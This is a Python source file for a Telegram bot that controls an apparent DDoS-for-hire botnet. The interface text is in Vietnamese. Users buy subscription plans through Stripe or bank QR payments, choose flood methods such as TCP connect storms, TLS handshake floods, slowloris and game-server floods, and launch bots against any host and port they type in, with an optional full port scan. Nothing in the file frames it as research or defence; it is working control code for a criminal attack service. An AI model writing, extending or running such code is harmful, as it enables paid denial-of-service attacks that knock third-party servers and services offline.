# Telegram Bot — Full C2 Control (v3 — attack fixed)
from __future__ import annotations

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton,
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)
from telegram.constants import ParseMode
from app.config import settings
from app.database import async_session
from app.models.all_models import (
    User, UserSubscription, Plan, AttackTask, TelegramSession, Payment,
)
from app.services.attack_service import AttackService, _normalize_method, _normalize_plan_methods
from app.services.bot_service import BotService
from app.schemas.all_schemas import AttackCreate
from sqlalchemy import select
from sqlalchemy.orm.attributes import flag_modified
from datetime import datetime, timezone
from typing import Optional, List, Dict, Any
from fastapi import HTTPException
import uuid
import html
import traceback

# ── Catalog ───────────────────────────────────────────────────────────────
METHOD_CATALOG: Dict[str, Dict[str, str]] = {
    "PSPE": {"icon": "🎯", "desc": "Multi-port protocol exhaust"},
    "TCP":  {"icon": "🔌", "desc": "Connect storm + hold"},
    "TLS":  {"icon": "🔐", "desc": "Handshake + GET flood"},
    "HTTP": {"icon": "🌐", "desc": "L7 pool + slowloris"},
    "GAME": {"icon": "🎮", "desc": "Game socket (NRO/MC/FiveM)"},
}
ALL_METHODS = list(METHOD_CATALOG.keys())

# Global app ref for clean shutdown
_tg_app: Optional[Application] = None


def esc(s: Any) -> str:
    return html.escape(str(s) if s is not None else "")


def main_menu_kb() -> ReplyKeyboardMarkup:
    rows = [
        [KeyboardButton("⚔️ Attack"), KeyboardButton("📊 Status")],
        [KeyboardButton("🛑 Stop"), KeyboardButton("🤖 Bots")],
        [KeyboardButton("📋 Plans"), KeyboardButton("💰 Buy")],
        [KeyboardButton("💵 Balance"), KeyboardButton("❓ Help")],
    ]
    try:
        return ReplyKeyboardMarkup(rows, resize_keyboard=True, is_persistent=True)
    except TypeError:
        # older python-telegram-bot without is_persistent
        return ReplyKeyboardMarkup(rows, resize_keyboard=True)


HELP_HTML = (
    "<b>🎯 C2 Control Panel</b>\n\n"
    "⚔️ /attack — Launch attack\n"
    "📊 /status — Active attacks\n"
    "🛑 /stop — Stop all\n"
    "🤖 /bots — Online bots\n"
    "📋 /plans · 💰 /buy — Plans\n"
    "💵 /balance — Plan &amp; credit\n"
    "❓ /help — This menu\n\n"
    "<i>Use the buttons below for quick access.</i>"
)


def progress_bar(elapsed: float, total: int, width: int = 10) -> str:
    if total <= 0:
        return "░" * width
    pct = min(1.0, max(0.0, elapsed / float(total)))
    filled = int(pct * width)
    return "█" * filled + "░" * (width - filled)


def err_text(e: Exception) -> str:
    """Extract human-readable error from HTTPException / generic Exception."""
    if isinstance(e, HTTPException):
        d = e.detail
        if isinstance(d, list):
            parts = []
            for item in d:
                if isinstance(item, dict):
                    parts.append(str(item.get("msg") or item))
                else:
                    parts.append(str(item))
            return "; ".join(parts) or str(e)
        return str(d)
    return str(e)


# ── Init ──────────────────────────────────────────────────────────────────
async def init_telegram():
    global _tg_app
    if not settings.TELEGRAM_BOT_TOKEN:
        print("[Telegram] No TELEGRAM_BOT_TOKEN — skipped")
        return
    try:
        app = Application.builder().token(settings.TELEGRAM_BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", cmd_start))
        app.add_handler(CommandHandler("plans", cmd_plans))
        app.add_handler(CommandHandler("buy", cmd_buy))
        app.add_handler(CommandHandler("attack", cmd_attack))
        app.add_handler(CommandHandler("stop", cmd_stop))
        app.add_handler(CommandHandler("status", cmd_status))
        app.add_handler(CommandHandler("balance", cmd_balance))
        app.add_handler(CommandHandler("bots", cmd_bots))
        app.add_handler(CommandHandler("help", cmd_help))
        app.add_handler(CommandHandler("menu", cmd_help))
        app.add_handler(CallbackQueryHandler(handle_callback))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        # Catch-all errors so one bad update doesn't kill the bot
        app.add_error_handler(on_error)

        await app.initialize()
        await app.start()
        await app.updater.start_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES,
        )
        _tg_app = app
        print("[Telegram] Bot started (v3)")
    except Exception as e:
        print(f"[Telegram] Init failed: {e}")
        traceback.print_exc()


async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
    print(f"[Telegram] handler error: {context.error}")
    traceback.print_exception(type(context.error), context.error, context.error.__traceback__)
    try:
        if isinstance(update, Update) and update.effective_message:
            await update.effective_message.reply_text(
                f"❌ Lỗi bot: {esc(context.error)}",
                parse_mode=ParseMode.HTML,
            )
    except Exception:
        pass


# ── DB helpers ────────────────────────────────────────────────────────────
async def get_user(tid: int) -> Optional[User]:
    async with async_session() as s:
        r = await s.execute(select(User).where(User.telegram_id == tid))
        return r.scalar_one_or_none()


async def get_user_plan(user: User):
    async with async_session() as s:
        r = await s.execute(select(UserSubscription).where(
            UserSubscription.user_id == user.id,
            UserSubscription.status == "active",
        ))
        sub = r.scalar_one_or_none()
        if not sub:
            return None, None
        r2 = await s.execute(select(Plan).where(Plan.id == sub.plan_id))
        return sub, r2.scalar_one_or_none()


async def ensure_session(user: User, chat_id: int) -> TelegramSession:
    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts = r.scalar_one_or_none()
        if not ts:
            ts = TelegramSession(user_id=user.id, chat_id=chat_id, state="idle", data={})
            s.add(ts)
            await s.commit()
            await s.refresh(ts)
            return ts
        # refresh chat_id
        if ts.chat_id != chat_id:
            ts.chat_id = chat_id
            await s.commit()
        return ts


async def set_session(user_id, *, state: str = None, data: dict = None, merge: bool = True):
    """Update TelegramSession state/data safely."""
    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user_id))
        ts = r.scalar_one_or_none()
        if not ts:
            return None
        if state is not None:
            ts.state = state
        if data is not None:
            if merge:
                d = dict(ts.data or {})
                d.update(data)
                ts.data = d
            else:
                ts.data = data
            flag_modified(ts, "data")
        await s.commit()
        return ts


def plan_methods(plan: Optional[Plan]) -> List[str]:
    if not plan:
        return list(ALL_METHODS)
    return _normalize_plan_methods(plan.allowed_methods)


# ── Commands ──────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tid = update.effective_user.id
    tname = update.effective_user.username or f"user_{tid}"

    # Deep-link login: /start TOKEN
    if context.args:
        token = context.args[0]
        try:
            from app.routers.auth_router import _pending_tokens
            entry = _pending_tokens.get(token)
            if entry and entry.get("expires") and entry["expires"] > datetime.now(timezone.utc):
                entry["state"] = "verified"
                entry["telegram_id"] = tid
                entry["telegram_username"] = tname
                await update.message.reply_text(
                    "✅ <b>Đăng nhập website thành công!</b>\nQuay lại dashboard.",
                    parse_mode=ParseMode.HTML,
                    reply_markup=main_menu_kb(),
                )
            else:
                # HTTP fallback (multi-worker)
                import aiohttp
                api_url = f"http://127.0.0.1:{settings.C2_PORT}/api/auth/telegram/verify-bot"
                async with aiohttp.ClientSession() as session:
                    async with session.post(api_url, json={
                        "token": token, "telegram_id": tid, "telegram_username": tname,
                    }) as r:
                        if r.status == 200:
                            await update.message.reply_text(
                                "✅ <b>Đăng nhập website thành công!</b>",
                                parse_mode=ParseMode.HTML,
                                reply_markup=main_menu_kb(),
                            )
                        else:
                            await update.message.reply_text(
                                "❌ Token hết hạn. Bấm User Login trên web rồi thử lại.",
                                reply_markup=main_menu_kb(),
                            )
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi: {esc(e)}", parse_mode=ParseMode.HTML)
        return

    async with async_session() as s:
        user = await get_user(tid)
        if not user:
            user = User(
                username=f"tg_{tid}", telegram_id=tid,
                password_hash="telegram_only", role="user",
            )
            s.add(user)
            await s.commit()
            await s.refresh(user)
            s.add(TelegramSession(
                user_id=user.id, chat_id=update.effective_chat.id,
                state="idle", data={},
            ))
            await s.commit()
            await update.message.reply_text(
                f"🎯 <b>Chào mừng!</b>\nTài khoản: <code>{esc(user.username)}</code>\n\n{HELP_HTML}",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_kb(),
            )
        else:
            sub, plan = await get_user_plan(user)
            plan_line = f"📦 Plan: <b>{esc(plan.name)}</b>" if plan else "📦 Plan: <i>chưa mua</i> → /buy"
            bots = await BotService.count_online()
            await update.message.reply_text(
                f"👋 <b>{esc(user.username)}</b>\n{plan_line}\n🤖 Online: <b>{bots}</b>\n\n{HELP_HTML}",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_kb(),
            )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_HTML, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())


async def cmd_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.is_active == True))
        plans = list(r.scalars().all())
    if not plans:
        await update.message.reply_text("Chưa có gói.")
        return
    kb = []
    lines = ["📋 <b>Gói cước</b>\n"]
    for p in plans:
        kb.append([InlineKeyboardButton(
            f"🛒 {p.name} — {p.price_vnd:,}đ",
            callback_data=f"buy_{p.slug}",
        )])
        methods = " · ".join(plan_methods(p)[:6])
        lines.append(
            f"<b>{esc(p.name)}</b> <code>{esc(p.slug)}</code>\n"
            f"  🤖 {p.max_bots} bot · ⏱ {p.max_attack_secs}s · 🔄 {p.cooldown_secs}s CD\n"
            f"  🎯 {esc(methods)}\n"
            f"  💰 <b>{p.price_vnd:,}đ</b> / ${p.price_usd}\n"
        )
    await update.message.reply_text(
        "\n".join(lines),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def cmd_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.", reply_markup=main_menu_kb())
        return
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.is_active == True))
        plans = list(r.scalars().all())
    if not plans:
        await update.message.reply_text("Chưa có gói.")
        return
    kb = [[InlineKeyboardButton(
        f"🛒 {p.name} — {p.price_vnd:,}đ", callback_data=f"buy_{p.slug}",
    )] for p in plans]
    await update.message.reply_text(
        "💰 <b>Chọn gói:</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start attack flow: pick method → enter host:port [duration] [scan]."""
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.", reply_markup=main_menu_kb())
        return

    sub, plan = await get_user_plan(user)
    if not sub or not plan:
        await update.message.reply_text(
            "❌ Chưa có plan active.\nDùng <b>Buy</b> hoặc /buy",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_kb(),
        )
        return

    await ensure_session(user, update.effective_chat.id)
    methods = plan_methods(plan)
    if not methods:
        methods = list(ALL_METHODS)

    kb = []
    row = []
    for m in methods:
        c = METHOD_CATALOG.get(m, {"icon": "•", "desc": m})
        row.append(InlineKeyboardButton(f"{c['icon']} {m}", callback_data=f"atk_m_{m}"))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton("❌ Huỷ", callback_data="atk_cancel")])

    desc_lines = [
        f"{METHOD_CATALOG[m]['icon']} <b>{m}</b> — <i>{esc(METHOD_CATALOG[m]['desc'])}</i>"
        for m in methods if m in METHOD_CATALOG
    ]
    await update.message.reply_text(
        f"⚔️ <b>Launch Attack</b>\n"
        f"📦 Plan: <b>{esc(plan.name)}</b> · max <b>{plan.max_attack_secs}s</b>\n\n"
        + "\n".join(desc_lines) + "\n\n"
        "👇 Chọn method:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    async with async_session() as s:
        r = await s.execute(select(AttackTask).where(
            AttackTask.user_id == user.id, AttackTask.status == "running",
        ))
        tasks = list(r.scalars().all())
    if not tasks:
        await update.message.reply_text("ℹ️ Không có attack đang chạy.", reply_markup=main_menu_kb())
        return
    n = 0
    for t in tasks:
        try:
            await AttackService.stop(t.id, user)
            n += 1
        except Exception as e:
            print(f"[Telegram] stop fail {t.id}: {e}")
    await update.message.reply_text(
        f"🛑 Đã stop <b>{n}</b> attack.",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_kb(),
    )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    async with async_session() as s:
        r = await s.execute(select(AttackTask).where(
            AttackTask.user_id == user.id, AttackTask.status == "running",
        ))
        tasks = list(r.scalars().all())
    if not tasks:
        await update.message.reply_text(
            "📊 <b>Không có attack active.</b>\n\n⚔️ /attack để launch",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_kb(),
        )
        return
    lines = ["📊 <b>Active Attacks</b>\n"]
    for t in tasks:
        elapsed = 0.0
        if t.started_at:
            started = t.started_at if t.started_at.tzinfo else t.started_at.replace(tzinfo=timezone.utc)
            elapsed = (datetime.now(timezone.utc) - started).total_seconds()
        bar = progress_bar(elapsed, t.duration_secs or 1)
        icon = METHOD_CATALOG.get((t.method or "").upper(), {}).get("icon", "•")
        lines.append(
            f"{icon} <code>{esc(t.target_host)}:{t.target_port}</code>\n"
            f"  {bar} {int(elapsed)}/{t.duration_secs}s\n"
            f"  Method <b>{esc(t.method)}</b> · 📦 <code>{(t.total_packets or 0):,}</code>\n"
            f"  🤖 {len(t.bot_ids or [])} bots\n"
        )
    lines.append("🛑 /stop để dừng")
    await update.message.reply_text(
        "\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
    )


async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    sub, plan = await get_user_plan(user)
    exp = sub.expires_at.strftime("%d/%m/%Y") if sub and sub.expires_at else "—"
    methods = " · ".join(plan_methods(plan)[:6]) if plan else "—"
    await update.message.reply_text(
        f"💵 <b>Tài khoản</b>\n"
        f"👤 <code>{esc(user.username)}</code>\n"
        f"💳 Credit: <code>${float(user.credit_balance or 0):.2f}</code>\n"
        f"📦 Plan: <b>{esc(plan.name) if plan else 'None'}</b>\n"
        f"📅 Hết hạn: <code>{esc(exp)}</code>\n"
        f"🎯 Methods: {esc(methods)}",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_kb(),
    )


async def cmd_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = await BotService.count_online()
    bar = "🟢" * min(count, 10) + ("⚪" * max(0, 10 - min(count, 10)))
    await update.message.reply_text(
        f"🤖 <b>Bot Network</b>\n\nOnline: <b>{count}</b>\n{bar}",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_kb(),
    )


# ── Callbacks ─────────────────────────────────────────────────────────────
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data or ""
    try:
        await query.answer()
    except Exception:
        pass

    user = await get_user(query.from_user.id)
    if not user:
        await query.edit_message_text("Session hết hạn. Gõ /start")
        return

    try:
        if data.startswith("buy_"):
            await _cb_buy(query, user, data[4:])
        elif data.startswith("pay_") and data.endswith("_stripe"):
            await _cb_pay_stripe(query, user, data[4:-7])
        elif data.startswith("pay_") and data.endswith("_mbank"):
            await _cb_pay_mbank(query, user, data[4:-6])
        elif data == "pay_cancel":
            await query.edit_message_text("Đã huỷ thanh toán.")
        elif data.startswith("atk_m_"):
            await _cb_atk_method(query, user, data[6:].upper())
        elif data == "atk_cancel":
            await set_session(user.id, state="idle", data={}, merge=False)
            await query.edit_message_text("Đã huỷ attack.")
        else:
            await query.edit_message_text("Lệnh không hợp lệ.")
    except Exception as e:
        print(f"[Telegram] callback error: {e}")
        traceback.print_exc()
        try:
            await query.edit_message_text(f"❌ {esc(err_text(e))}", parse_mode=ParseMode.HTML)
        except Exception:
            pass


async def _cb_buy(query, user, slug: str):
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.slug == slug))
        plan = r.scalar_one_or_none()
    if not plan:
        await query.edit_message_text("Plan not found.")
        return
    kb = [
        [InlineKeyboardButton(f"💳 Stripe — ${plan.price_usd}", callback_data=f"pay_{plan.slug}_stripe")],
        [InlineKeyboardButton(f"🏦 MB Bank — {plan.price_vnd:,}đ", callback_data=f"pay_{plan.slug}_mbank")],
        [InlineKeyboardButton("« Huỷ", callback_data="pay_cancel")],
    ]
    await query.edit_message_text(
        f"🛒 <b>{esc(plan.name)}</b>\n"
        f"💰 {plan.price_vnd:,}đ / ${plan.price_usd}\n"
        f"🤖 {plan.max_bots} bots · ⏱ {plan.max_attack_secs}s\n\n"
        f"Chọn thanh toán:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(kb),
    )


async def _cb_pay_stripe(query, user, slug: str):
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.slug == slug))
        plan = r.scalar_one_or_none()
    if not plan:
        await query.edit_message_text("Plan not found.")
        return
    if not settings.STRIPE_SECRET_KEY:
        await query.edit_message_text("Stripe chưa cấu hình.")
        return
    import stripe
    stripe.api_key = settings.STRIPE_SECRET_KEY
    try:
        session = stripe.checkout.Session.create(
            payment_method_types=["card"],
            line_items=[{
                "price_data": {
                    "currency": "usd",
                    "product_data": {"name": f"C2 {plan.name}"},
                    "unit_amount": int(float(plan.price_usd) * 100),
                },
                "quantity": 1,
            }],
            mode="payment",
            success_url=f"{settings.DASHBOARD_URL}/payment/success",
            cancel_url=f"{settings.DASHBOARD_URL}/payment/cancel",
            metadata={"user_id": str(user.id), "plan_id": str(plan.id)},
        )
        async with async_session() as s:
            s.add(Payment(
                user_id=user.id, amount_vnd=plan.price_vnd, amount_usd=plan.price_usd,
                method="stripe", tx_ref=session.id, payment_url=session.url,
            ))
            await s.commit()
        await query.edit_message_text(
            f'💳 <a href="{esc(session.url)}">Thanh toán Stripe</a>',
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=False,
        )
    except Exception as e:
        await query.edit_message_text(f"Stripe error: {esc(e)}", parse_mode=ParseMode.HTML)


async def _cb_pay_mbank(query, user, slug: str):
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.slug == slug))
        plan = r.scalar_one_or_none()
    if not plan:
        await query.edit_message_text("Plan not found.")
        return
    tx_ref = f"C2{uuid.uuid4().hex[:8].upper()}"
    async with async_session() as s:
        s.add(Payment(
            user_id=user.id, amount_vnd=plan.price_vnd, amount_usd=plan.price_usd,
            method="mbank", tx_ref=tx_ref,
            meta={"plan_id": str(plan.id), "plan_slug": plan.slug},
        ))
        await s.commit()
    from app.mbbank import payment_qr_payload
    body = payment_qr_payload(
        amount=int(plan.price_vnd),
        tx_ref=tx_ref,
        account_no=settings.MB_ACCOUNT_NUMBER,
        account_name=settings.MB_ACCOUNT_NAME or "",
    )
    qr = body.get("qr_url") or ""
    text = (
        f"🏦 <b>VietQR — MB Bank</b>\n"
        f"📦 <b>{esc(plan.name)}</b>\n"
        f"💰 <b>{plan.price_vnd:,}đ</b>\n"
        f"🏧 STK: <code>{esc(body.get('bank_account'))}</code>\n"
        f"👤 <code>{esc(body.get('account_name') or '—')}</code>\n"
        f"📝 CK: <code>{esc(tx_ref)}</code>\n\n"
        f"Quét QR trong app ngân hàng."
    )
    if qr:
        try:
            await query.message.reply_photo(photo=qr, caption=text, parse_mode=ParseMode.HTML)
            await query.edit_message_text("✅ VietQR đã gửi bên dưới.")
        except Exception:
            await query.edit_message_text(text, parse_mode=ParseMode.HTML)
    else:
        await query.edit_message_text(text, parse_mode=ParseMode.HTML)


async def _cb_atk_method(query, user, method: str):
    """User picked a method → ask for target in one step."""
    method = _normalize_method(method)
    if method not in METHOD_CATALOG:
        await query.edit_message_text("Method không hợp lệ.")
        return

    sub, plan = await get_user_plan(user)
    allowed = plan_methods(plan)
    if method not in allowed:
        await query.edit_message_text(
            f"❌ Method <b>{esc(method)}</b> không có trong plan.\n"
            f"Cho phép: {esc(', '.join(allowed))}",
            parse_mode=ParseMode.HTML,
        )
        return

    await ensure_session(user, query.message.chat_id)
    await set_session(user.id, state="setting_target", data={
        "method": method,
        "duration": min(60, plan.max_attack_secs if plan else 60),
        "scan": False,
    }, merge=False)

    c = METHOD_CATALOG[method]
    default_port = 14443 if method == "GAME" else 443
    max_s = plan.max_attack_secs if plan else 120
    await query.edit_message_text(
        f"{c['icon']} <b>{esc(method)}</b>\n"
        f"<i>{esc(c['desc'])}</i>\n\n"
        f"✏️ Gửi target ngay (1 tin nhắn):\n"
        f"<code>host:port</code>\n"
        f"<code>host:port duration</code>\n"
        f"<code>host:port duration scan</code>\n\n"
        f"VD:\n"
        f"<code>1.2.3.4:{default_port}</code>\n"
        f"<code>game.com:30120 90</code>\n"
        f"<code>1.2.3.4:443 120 scan</code>\n\n"
        f"⏱ Default duration: 60s (max {max_s}s)\n"
        f"🔍 <code>scan</code> = full port scan 1-65535 trên C2",
        parse_mode=ParseMode.HTML,
    )


# ── Text messages ──────────────────────────────────────────────────────────
MENU_MAP = {
    "⚔️ Attack": cmd_attack,
    "Attack": cmd_attack,
    "📊 Status": cmd_status,
    "Status": cmd_status,
    "🛑 Stop": cmd_stop,
    "Stop": cmd_stop,
    "🤖 Bots": cmd_bots,
    "Bots": cmd_bots,
    "📋 Plans": cmd_plans,
    "Plans": cmd_plans,
    "💰 Buy": cmd_buy,
    "Buy": cmd_buy,
    "💵 Balance": cmd_balance,
    "Balance": cmd_balance,
    "❓ Help": cmd_help,
    "Help": cmd_help,
}


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    user = await get_user(update.effective_user.id)
    if not user:
        # Auto-register so menu buttons work after /start was missed
        return

    text = update.message.text.strip()

    # Persistent keyboard
    if text in MENU_MAP:
        await MENU_MAP[text](update, context)
        return
    # Also match without emoji noise
    for key, handler in MENU_MAP.items():
        if text.lower() == key.lower() or text.endswith(key.split()[-1]):
            # only for exact short words like "Attack"
            if text in ("Attack", "Status", "Stop", "Bots", "Plans", "Buy", "Balance", "Help"):
                await handler(update, context)
                return

    # Attack target input
    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts = r.scalar_one_or_none()

    if not ts or ts.state != "setting_target":
        return

    await _launch_from_text(update, user, ts, text)


async def _launch_from_text(update: Update, user: User, ts: TelegramSession, text: str):
    parts = text.split()
    if not parts:
        await update.message.reply_text(
            "❌ Format: <code>host:port [duration] [scan]</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    data = dict(ts.data or {})
    method = _normalize_method(data.get("method") or "PSPE")
    duration = int(data.get("duration") or 60)
    do_scan = bool(data.get("scan"))

    host_port = parts[0]
    if len(parts) >= 2:
        try:
            duration = int(parts[1])
        except ValueError:
            await update.message.reply_text("❌ Duration phải là số giây.")
            return
    if len(parts) >= 3 and parts[2].lower() in ("scan", "full", "1", "true", "yes"):
        do_scan = True

    # Parse host:port (also accept host only)
    host, port = host_port, 80
    if "://" in host:
        # strip scheme
        host = host.split("://", 1)[1]
    host = host.split("/")[0]  # strip path
    if ":" in host:
        host, p = host.rsplit(":", 1)
        try:
            port = int(p)
        except ValueError:
            await update.message.reply_text("❌ Port không hợp lệ.")
            return
    if port <= 0 or port > 65535:
        await update.message.reply_text("❌ Port phải 1–65535.")
        return
    if not host:
        await update.message.reply_text("❌ Host trống.")
        return

    sub, plan = await get_user_plan(user)
    if not sub or not plan:
        await update.message.reply_text("❌ Chưa có plan. /buy")
        await set_session(user.id, state="idle", data={}, merge=False)
        return

    allowed = plan_methods(plan)
    if method not in allowed:
        await update.message.reply_text(
            f"❌ Method <b>{esc(method)}</b> không có trong plan.\n"
            f"Cho phép: {esc(', '.join(allowed))}",
            parse_mode=ParseMode.HTML,
        )
        await set_session(user.id, state="idle", data={}, merge=False)
        return

    duration = max(1, min(duration, plan.max_attack_secs or 120))
    wait_msg = await update.message.reply_text(
        f"⏳ Launching <b>{esc(method)}</b> → <code>{esc(host)}:{port}</code>…"
        + ("\n🔍 Full scan…" if do_scan else ""),
        parse_mode=ParseMode.HTML,
    )

    try:
        atk = AttackCreate(
            target_host=host,
            target_port=port,
            method=method,
            duration_secs=duration,
            pps_per_bot=plan.max_pps_per_bot or 100000,
            bot_count=max(1, plan.max_concurrent or 1),
            mega_mode=(method == "PSPE"),
            tls_exhaust=(method == "TLS"),
            scan_ports=do_scan,
        )
        task = await AttackService.launch(user, atk)
        icon = METHOD_CATALOG.get(method, {}).get("icon", "⚔️")
        n_bots = len(task.bot_ids or [])
        await wait_msg.edit_text(
            f"✅ <b>Attack launched</b>\n"
            f"{icon} Method: <b>{esc(method)}</b>\n"
            f"🎯 Target: <code>{esc(host)}:{port}</code>\n"
            f"⏱ Duration: <b>{duration}s</b>\n"
            f"🔍 Scan: <b>{'full 1–65535' if do_scan else 'port only'}</b>\n"
            f"🤖 Bots: <b>{n_bots}</b>\n\n"
            f"📊 /status · 🛑 /stop",
            parse_mode=ParseMode.HTML,
        )
    except HTTPException as e:
        detail = err_text(e)
        print(f"[Telegram] launch HTTP {e.status_code}: {detail}")
        # 202 = queued (no bots free right now) — not a hard fail
        if e.status_code == 202:
            try:
                await wait_msg.edit_text(
                    f"📥 <b>Attack queued</b>\n"
                    f"<code>{esc(detail)}</code>\n\n"
                    f"Sẽ tự chạy khi có bot online.\n"
                    f"📊 /status · 🤖 /bots",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                await update.message.reply_text(f"📥 {esc(detail)}", parse_mode=ParseMode.HTML)
        else:
            try:
                await wait_msg.edit_text(
                    f"❌ <b>Launch failed</b> ({e.status_code})\n"
                    f"<code>{esc(detail)}</code>\n\n"
                    f"• Plan methods: {esc(', '.join(allowed))}\n"
                    f"• Kiểm tra bot online (/bots)\n"
                    f"• Cooldown / concurrent limit",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                await update.message.reply_text(f"❌ {esc(detail)}", parse_mode=ParseMode.HTML)
    except Exception as e:
        detail = err_text(e)
        print(f"[Telegram] launch error: {detail}")
        traceback.print_exc()
        try:
            await wait_msg.edit_text(
                f"❌ <b>Launch failed</b>\n<code>{esc(detail)}</code>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            await update.message.reply_text(f"❌ {esc(detail)}", parse_mode=ParseMode.HTML)
    finally:
        await set_session(user.id, state="idle", data={}, merge=False)
